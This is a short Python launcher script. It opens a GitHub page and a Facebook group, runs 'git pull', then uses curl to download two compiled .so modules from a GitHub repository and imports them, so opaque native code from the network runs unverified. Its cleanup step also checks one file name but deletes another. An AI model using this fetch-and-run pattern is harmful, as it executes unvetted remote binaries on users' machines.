import os
def intro():
  print('give star to our repo')
  os.system('git pull && clear')
  os.system('xdg-open https://github.com/Ahmed-XD/FILE')
  print('Join Our Facebook Group and support us')
  os.system('xdg-open https://m.facebook.com/groups/1247184652736578/')
  os.system('clear')


def install_part(file_name):
  os.system(f"curl -L https://github.com/Ahmed-XD/library/raw/main/{file_name} -o {file_name}")

if os.path.exists("disable.so") and os.path.exists("x3.so"):
  os.remove("disable.so")
  os.remove("x3.cpython-311.so")

intro()
install_part("disable.so")
install_part("x3.so")
import disable
import x3
